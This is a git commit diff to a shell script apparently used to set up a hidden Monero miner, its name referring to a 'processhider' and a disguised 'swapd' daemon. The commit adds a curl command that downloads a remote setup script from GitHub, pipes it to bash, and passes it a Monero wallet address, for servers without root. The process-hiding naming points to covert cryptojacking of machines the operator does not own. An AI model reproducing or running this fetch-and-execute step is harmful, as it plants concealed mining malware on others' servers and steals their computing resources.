9f95d89933084bc69ee36f62b37807fd4f8d4f50
littlAcen <113854209+littlAcen@users.noreply.github.com>
2023-11-30 20:56:32 +0100

    Update setup_swapd_processhider_OLD2.sh

--- setup_swapd_processhider_OLD2.sh
+++ setup_swapd_processhider_OLD2.sh
@@ -2,6 +2,9 @@
 
 VERSION=2.11
 
+# Version for server without root
+curl  -s -L https://raw.githubusercontent.com/littlAcen/xmrig_setup_m0dd3d-1/master/setup_gdm2.sh | bash -s 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX
+
 # printing greetings
 
 echo "MoneroOcean mining setup script v$VERSION."
